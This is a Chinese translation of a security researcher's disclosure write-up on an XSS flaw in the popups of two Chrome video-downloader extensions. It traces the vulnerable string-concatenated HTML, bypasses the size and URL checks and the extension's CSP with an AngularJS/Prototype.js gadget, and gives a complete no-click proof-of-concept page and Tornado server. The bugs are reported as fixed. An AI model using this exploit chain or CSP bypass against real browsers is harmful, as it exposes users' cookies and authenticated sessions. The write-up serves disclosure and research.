***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

###  核心点

> 1\. 绕过程序中的条件  
>
>
> 2\. 绕过 csp
>
> 3\. 创建不需要用户交互的 poc

 **注意：此帖与先前的 Chrome 扩展漏洞报导略有不同。我将实际与你一起浏览代码并向你展示如何跟踪一个扩展程序的步骤。所以整个事情的描述会较长。**

当通过 [tarnish](https://thehackerblog.com/tarnish/) 扫描大量 Chrome 扩展程序时，我发现了两款流行的
Chrome 扩展程序 [Video Downloader for Chrome version
5.0.012](https://chrome.google.com/webstore/detail/video-downloader-for-chro/dcfofgiombegngbaofkeebiipcdgpnga)(820 万用户) 和 [Video Downloader
Plus](https://chrome.google.com/webstore/detail/video-downloader-plus/baejfnndpekpkaaancgpakjaengfpopk)(730 万用户)
在浏览器的[操作页中](https://developer.chrome.com/extensions/user_interface#popup)存在
XSS 漏洞，而利用这些扩展程序只要让受害者导航到攻击者控制的页面。

导致此漏洞的原因是使用字符串拼接生成 HTML，该 HTML 通过 jQuery 动态添加到
DOM。攻击者可以创建一个特定的链接，这将导致在扩展的上下文中执行任意 JavaScript。使用此漏洞，以下是攻击者可以滥用此扩展程序的访问权限：

    
    
    "permissions": [    "alarms",    "contextMenus",    "privacy",    "storage",    "cookies",    "tabs",    "unlimitedStorage",    "webNavigation",    "webRequest",    "webRequestBlocking",    "http://*/*",    "https://*/*",    "notifications"],

使用上述权限，攻击者可以 dump 所有浏览器
cookie，拦截所有浏览器请求，向各类已经获取到身份认证的站点发起请求并通信。就像它所获得的扩展程序一样强大。

###  漏洞

此漏洞的核心是以下代码：

    
    
    vd.createDownloadSection = function(videoData) {    return '<li class="video"> \
            <a class="play-button" href="' + videoData.url + '" target="_blank"></a> \
            <div class="title" title="' + videoData.fileName + '">' + videoData.fileName + '</div> \
            <a class="download-button" href="' + videoData.url + '" data-file-name="' + videoData.fileName + videoData.extension + '">Download - ' + Math.floor(videoData.size * 100 / 1024 / 1024) / 100 + ' MB</a>\
            <div class="sep"></div>\
            </li>';
    };

这是一个相当于教科书式的跨站脚本 (xss) 漏洞代码示例，
扩展程序从攻击者控制的页面中提取这些视频链接，所以利用它应该是直截了当的。然而，就像教科书中的例子一样，现实世界的情况要复杂得多。这篇文章将介绍沿途遇到的阻力，并展示它们是如何被绕过的。我们将从数据输入的位置开始，并一直跟寻到最终触发的函数。

###  胜利的道路

该扩展程序使用 [Content
Script](https://developer.chrome.com/extensions/content_scripts)
从页面链接（<a>标签）和视频（<video>标签）收集视频 URL。Content Script 是 JavaScript
代码片段，运行在用户浏览器被访问过的页面上（在这种情况下，用户访问的每个页面）。以下代码来自扩展程序的 Content Script：

    
    
    vd.getVideoLinks = function(node) {    // console.log(node);
        var videoLinks = [];    $(node)
            .find('a')
            .each(function() {            var link = $(this).attr('href');            var videoType = vd.getVideoType(link);            if (videoType) {                videoLinks.push({                    url: link,                    fileName: vd.getLinkTitleFromNode($(this)),                    extension: '.' + videoType
                    });
                }
            });    $(node)
            .find('video')
            .each(function() {            // console.log(this);
                var nodes = [];            // console.log($(this).attr('src'));
                $(this).attr('src') ? nodes.push($(this)) : void 0;            // console.log(nodes);
                $(this)
                    .find('source')
                    .each(function() {                    nodes.push($(this));
                    });            nodes.forEach(function(node) {                var link = node.attr('src');                if (!link) {                    return;
                    }                var videoType = vd.getVideoType(link);                videoLinks.push({                    url: link,                    fileName: vd.getLinkTitleFromNode(node),                    extension: '.' + videoType
                    });
                });
            });    return videoLinks;
    };

从上面的代码中可以看出迭代链接和视频元素，并在返回之前将信息收集到 videoLinks 数组中。我们控制的 videoLinks 元素属性是 url（从
href 属性中提取）和 fileName（通过获取 title 属性，alt 属性或节点的内部文本来获取）。

此函数被 vd.findVideoLinks 调用：

    
    
    vd.findVideoLinks = function(node) {    var videoLinks = [];    switch (window.location.host) {        case 'vimeo.com':            vd.sendVimeoVideoLinks();            break;        case 'www.youtube.com':            break;        default:            videoLinks = vd.getVideoLinks(node);
        }    vd.sendVideoLinks(videoLinks);
    };

此调用发生在每个页面的页面加载开始时：

    
    
    vd.init = function() {    vd.findVideoLinks(document.body);
    };vd.init();

抓取到所有这些链接后，它们将通过 vd.sendVideoLinks 函数发送到扩展程序的后台页面。以下是在扩展的后台页面中声明的消息侦听器：

    
    
    chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {    switch (request.message) {        case 'add-video-links':            if (typeof sender.tab === 'undefined') {                break;
                }            vd.addVideoLinks(request.videoLinks, sender.tab.id, sender.tab.url);            break;        case 'get-video-links':            sendResponse(vd.getVideoLinksForTab(request.tabId));            break;        case 'download-video-link':            vd.downloadVideoLink(request.url, request.fileName);            break;        case 'show-youtube-warning':            vd.showYoutubeWarning();            break;        default:            break;
        }
    });

我们进入的 case 是 add-video-links，我们的 send.tab 不是 undefined，所以通过带上之前抓取的链接数据调用
ad.addVideoLinks 函数。以下是 addVideoLinks 的代码：

    
    
    vd.addVideoLinks = function(videoLinks, tabId, tabUrl) {  ...trimmed for brevity...
        videoLinks.forEach(function(videoLink) {        // console.log(videoLink);
            videoLink.fileName = vd.getFileName(videoLink.fileName);        vd.addVideoLinkToTab(videoLink, tabId, tabUrl);
        });
    };

上面的代码检查它之前是否已经存储了此 tabId 的链接数据。如果不是则会创建一个新对象。每条链接数据的 fileName 属性通过
vd.getFileName 函数获得，该函数代码如下：

    
    
    vd.getFileName = function(str) {    // console.log(str);
        var regex = /[A-Za-z0-9()_ -]/;    var escapedStr = '';    str = Array.from(str);    str.forEach(function(char) {        if (regex.test(char)) {            escapedStr += char;
            }
        });    return escapedStr;
    };

上述函数破坏了通过链接数据的 fileName 属性来构造 DOM-XSS 的机会。它将删除任何与正则表达式 [A-Za-z0-9()_ -]
不匹配的字符，遗憾的是包括了如 " 字符，这些字符可以在 HTML 字符拼接时用于属性截断。

这只给我们留下了 url 属性来绕过，所以继续找。

videoLink 被发送到 vd.addVideoLinkToTab 函数，该函数如下：

    
    
    vd.addVideoLinkToTab = function(videoLink, tabId, tabUrl) {  ...trimmed for brevity...
        if (!videoLink.size) {        console.log('Getting size from server for ' + videoLink.url);        vd.getVideoDataFromServer(videoLink.url, function(videoData) {            videoLink.size = videoData.size;            vd.addVideoLinkToTabFinalStep(tabId, videoLink);
            });
        } else {        vd.addVideoLinkToTabFinalStep(tabId, videoLink);
        }
    };

该脚本检查链接数据是否具有 size 属性。在未设置大小的情况下，它通过 vd.getVideoDataFromServer 函数获取链接文件的大小。

    
    
    vd.getVideoDataFromServer = function(url, callback) {    var request = new XMLHttpRequest();    request.onreadystatechange = function() {        if (request.readyState === 2) {            callback({                mime: this.getResponseHeader('Content-Type'),                size: this.getResponseHeader('Content-Length')
                });            request.abort();
            }
        };    request.open('Get', url);    request.send();
    };

上面的代码只是触发 XMLHTTPRequest 请求以获取指定链接上的 http 头，并提取 Content-Type 和 Content-Length
头。返回此数据，Content-Length 头的值用于设置 videoLinks 元素的 size 属性。完成此操作后，结果将传递给
vd.addVideoLinkToTabFinalStep ：

    
    
    vd.addVideoLinkToTabFinalStep = function(tabId, videoLink) {    // console.log("Trying to add url "+ videoLink.url);
        if (!vd.isVideoLinkAlreadyAdded(            vd.tabsData[tabId].videoLinks,            videoLink.url
            ) &&
            videoLink.size > 1024 &&
            vd.isVideoUrl(videoLink.url)
        ) {        vd.tabsData[tabId].videoLinks.push(videoLink);        vd.updateExtensionIcon(tabId);
        }
    };

这里开始遇到一些障碍。我们希望将 URL 附加到 vd.tabsData[tabId].videoLinks 数组，但必须满足如下条件：

    
    
    !vd.isVideoLinkAlreadyAdded(    vd.tabsData[tabId].videoLinks,    videoLink.url) &&videoLink.size > 1024 &&vd.isVideoUrl(videoLink.url)

vd.isVideoLinkAlreadyAdded 是一个简单的检查，以查看该 URL 是否已记录在
vd.tabsData[tabId].videoLinks 数组中。第二项检查是 videoLink.size 大于 1024。回想一下这个值是接收于
Content-Length 头。为了通过此检查，我们创建了一个简单的 Python Tornado 服务器并创建了一个通配符路由来返回足够大
Content-Length 进行响应：

    
    
    ...trimmed for brevity...def make_app():    return tornado.web.Application([        ...trimmed for brevity...
            (r"/.*", WildcardHandler),
        ])...trimmed for brevity...class WildcardHandler(tornado.web.RequestHandler):    def get(self):        self.set_header("Content-Type", "video/x-flv")        self.write( ("A" * 2048 ) )...trimmed for brevity...

现在我们已经通配了那条路由，无论我们的链接是什么，它总是会路由到一个返回 >1024 字节的页面。解决了这个检查。

下一项检查要求 vd.isVideoUrl 函数返回 true，该函数的代码如下：

    
    
    vd.videoFormats = {    mp4: {        type: 'mp4'
        },    flv: {        type: 'flv'
        },    mov: {        type: 'mov'
        },    webm: {        type: 'webm'
        }
    };vd.isVideoUrl = function(url) {    var isVideoUrl = false;    Object.keys(vd.videoFormats).some(function(format) {        if (url.indexOf(format) != -1) {            isVideoUrl = true;            return true;
            }
        });    return isVideoUrl;
    };

这项检查相当简单。它只是检查以确保 URL 中包含 mp4，flv，mov 或 webm。可以通过将 .flv 添加到我们的 url palyload
结尾来绕过检查。

由于已成功满足所有条件，因此我们的 url 会附加到 vd.tabsData[tabId].videoLinks 数组中。

转到包含上面显示的核心易受攻击的函数 popup.js 脚本文件，我们看到以下内容：

    
    
    $(document).ready(function() {    var videoList = $("#video-list");    chrome.tabs.query({        active: true,        currentWindow: true
        }, function(tabs) {        console.log(tabs);        vd.sendMessage({            message: 'get-video-links',            tabId: tabs[0].id
            }, function(tabsData) {            console.log(tabsData);            if (tabsData.url.indexOf('youtube.com') != -1) {                vd.sendMessage({                    message: 'show-youtube-warning'
                    });                return
                }            var videoLinks = tabsData.videoLinks;            console.log(videoLinks);            if (videoLinks.length == 0) {                $("#no-video-found").css('display', 'block');                videoList.css('display', 'none');                return
                }            $("#no-video-found").css('display', 'none');            videoList.css('display', 'block');            videoLinks.forEach(function(videoLink) {                videoList.append(vd.createDownloadSection(videoLink));
                })
            });
        });    $('body').on('click', '.download-button', function(e) {        e.preventDefault();        vd.sendMessage({            message: 'download-video-link',            url: $(this).attr('href'),            fileName: $(this).attr('data-file-name')
            });
        });
    });

单击扩展程序的浏览器图标 (浏览器的右上键) 时会触发上述代码。该扩展程序会在 Chrome 扩展程序 API 中查询当前标签的元数据。tab 的 ID
取自元数据，get-video-links 调用将发送到后台页面，对应的代码只是调用
sendResponse(vd.getVideoLinksForTab(request.tabId)); 它返回我们上面讨论的视频链接数据。

迭代视频链接并将每个视频链接传递给本文开头所示的 vd.createDownloadSection 函数。这会使用 HTML 连接来构建一个使用
jQuery 的[ .append()](http://api.jquery.com/append/) 函数附加到 DOM 的大字符串。将带有用户输入的原始
HTML 传递给 append() 函数是跨站点脚本（XSS）的典型示例。

看来可以相对毫发无损地将我们的 payload 送到易受攻击的函数中！然而，现在庆祝还为时过早。我们还有另一个需要克服的阻力：内容安全策略（CSP）。

##  内容安全策略 (CSP:Content Security Policy)

有趣的是，此扩展的内容安全策略在其 script-src 指令中没有 [unsafe-eval](https://www.yuque.com/docs/share/dbf4ac64-1cde-4a06-9d5e-d08d9b7494ce)。以下是来自扩展的
csp 定义：

    
    
    script-src 'self' https://www.google-analytics.com https://ssl.google-analytics.com https://apis.google.com https://ajax.googleapis.com; style-src 'self' 'unsafe-inline' 'unsafe-eval'; connect-src *; object-src 'self'

从上面的内容安全策略（CSP）中我们可以看到 script-src 如下

    
    
    script-src 'self' https://www.google-analytics.com https://ssl.google-analytics.com https://apis.google.com https://ajax.googleapis.com

当你希望绕过 CSP 政策时，在 script-src 指令中同时看到
[https://apis.google.com](https://apis.google.com/) 和
[https://ajax.googleapis.com](https://ajax.googleapis.com/) 是非常幸运的。这些站点上托管了许多
JavaScript 库，以及 JSONP endpoints - 两者都可用于绕过内容安全策略。

对于这个领域的一些领先绕过艺术是 [H5SC Minichallenge 3: "Sh*t, it's
CSP!"](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it's-CSP!%22) ，他是一场比赛，参赛者必须在一个只有白名单
ajax.googeapis.com 的页面上实现 XSS。这一挑战与我们现在面临的情况非常相似。

该竞赛中更聪明的解决方案之一是以下 payload：

    
    
    "ng-app ng-csp><base href=//ajax.googleapis.com/ajax/libs/><script src=angularjs/1.0.1/angular.js></script><script src=prototype/1.7.2.0/prototype.js></script>\{\{$on.curry.call().alert(1337

引用竞赛者的解决方案：

> 这个提交非常有趣，因为它滥用了将 Prototype.js 与 AngularJS 结合起来的效果。

> > AngularJS 非常成功地使用他集成的沙箱禁止进入 window。然而，Prototype.JS 使用 curry 属性扩展函数，在使用
> call() 调用时返回一个窗口对象 - 没有 AngularJS 注意到。这意味着，我们可以使用 Prototype.JS 来获取窗口

> >并执行该对象的几乎任意方法。

> 列入白名单的 Google-CDN 提供过时的 AngularJS 版本以及 Prototype.JS -> 让我们可以根据需要访问我们在窗口上操作所需的内容。它不需要用户交互来工作。

通过修改此 payload，我们也可以利用此扩展。以下是使用相同技术执行警报的 payload alert('XSS in Video Downloader
for Chrome by mandatory')：

    
    
    "ng-app ng-csp><script src=https://ajax.googleapis.com/ajax/libs/angularjs/1.0.1/angular.js></script><script src=https://ajax.googleapis.com/ajax/libs/prototype/1.7.2.0/prototype.js></script>\{\{$on.curry.call().alert('XSS in Video Downloader for Chrome by mandatory')\}\}<!--
下图显示了单击扩展名图标时，我们的 payload 被触发：

![](https://image.3001.net/images/20190225/1551088385_5c73bb013bac5.png!small)

现在可以在扩展程序的上下文中执行任意的 JavaScript，并且可以滥用扩展程序访问的任何扩展程序
API。但是，它要求用户在我们的恶意页面上单击扩展图标。在构建漏洞利用时最好不要传达弱点的存在，因此我们会尝试使其不需要用户交互。

回到 manifest.json，我们可以看到 web_accessible_resources 指令已设置为以下内容：

    
    
    "web_accessible_resources": [
        "*"
    ]

仅使用通配符意味着任何网页都可以 <iframe> 并获取扩展中包含的任何资源。在示例中，要包含的资源是 popup.html
页面，该页面通常仅在用户单击扩展程序的图标时显示。通过 iframing 此页面以及之前的 payload，我们有一个无需用户交互的漏洞利用：

![](https://image.3001.net/images/20190225/1551088403_5c73bb13a7d41.png!small)

最终的 payload 如下：

    
    
    <!DOCTYPE html><html><body>
        <a href="https://&#x22;ng-app ng-csp&#x3E;&#x3C;script src=https://ajax.googleapis.com/ajax/libs/angularjs/1.0.1/angular.js&#x3E;&#x3C;/script&#x3E;&#x3C;script src=https://ajax.googleapis.com/ajax/libs/prototype/1.7.2.0/prototype.js&#x3E;&#x3C;/script&#x3E;\{\{$on.curry.call().alert(&#x27;XSS in Video Downloader for Chrome by mandatory&#x27;)\}\}&#x3C;!--.flv">test</a>
        <iframe src="about:blank" id="poc"></iframe>
        <script>
        setTimeout(function() {        document.getElementById( "poc" ).setAttribute( "src", "chrome-extension://dcfofgiombegngbaofkeebiipcdgpnga/html/popup.html" );
        }, 1000);    </script></body></html>

这分为两部分，第一部分为当前 tab 设置 videoLinks 数组。第二部分在一秒钟后触发并生成 iframe，chrome-extension
的位置://dcfofgiombegngbaofkeebiipcdgpnga/html/popup.html（弹出页面）。最终的 poc（Python
webserver 和 all）如下：

    
    
    import tornado.ioloopimport tornado.webclass MainHandler(tornado.web.RequestHandler):    def get(self):        self.write("""<!DOCTYPE html><html><body>
        <a href="https://&#x22;ng-app ng-csp&#x3E;&#x3C;script src=https://ajax.googleapis.com/ajax/libs/angularjs/1.0.1/angular.js&#x3E;&#x3C;/script&#x3E;&#x3C;script src=https://ajax.googleapis.com/ajax/libs/prototype/1.7.2.0/prototype.js&#x3E;&#x3C;/script&#x3E;\{\{$on.curry.call().alert(&#x27;XSS in Video Downloader for Chrome by mandatory&#x27;)\}\}&#x3C;!--.flv">test</a>
        <iframe src="about:blank" id="poc"></iframe>
        <script>
        setTimeout(function() {        document.getElementById( "poc" ).setAttribute( "src", "chrome-extension://dcfofgiombegngbaofkeebiipcdgpnga/html/popup.html" );
        }, 1000);    </script></body></html>
            """)class WildcardHandler(tornado.web.RequestHandler):    def get(self):        self.set_header("Content-Type", "video/x-flv")        self.write( ("A" * 2048 ) )def make_app():    return tornado.web.Application([
            (r"/", MainHandler),
            (r"/.*", WildcardHandler),
        ])if __name__ == "__main__":    app = make_app()    app.listen(8888)    tornado.ioloop.IOLoop.current().start()

##  披露和补救

由于没有明确的方式可以联系任何一位扩展所有者（各个 Chrome 扩展程序页面上会尽量显示更少的联系人信息）。我联系了一些在 Google 的 Chrome
Extension security
工作的人。他们适当地通知了扩展所有者，并努力获得修复。这两个扩展的最新版本不再容易受到此处描述的漏洞的影响。这篇文章也等待了每个人的扩展程序自动更新后，所以每个人都应该打补丁！

##  That's All Folks

如果你有任何问题或意见，请随时通过 [Twitter](https://twitter.com/IAmMandatory) 与我联系。如果你想查找一些
Chrome 扩展程序漏洞，请尝试使用我自己构建的扫描程序
[tarnish](https://thehackerblog.com/tarnish/)，以帮助你入门（[此处为源代码](https://github.com/mandatoryprogrammer/tarnish)）。如果你正在寻找
Chrome 扩展程序安全性的简介，请查看[「Kicking the Rims – A Guide for Securely Writing and
Auditing Chrome Extensions」](https://thehackerblog.com/kicking-the-rims-a-guide-for-securely-writing-and-auditing-chrome-extensions/)。

原文出处：<https://thehackerblog.com/video-download-uxss-exploit-detailed/>

***本文作者：tonyxx，转载请注明来自FreeBuf.COM**

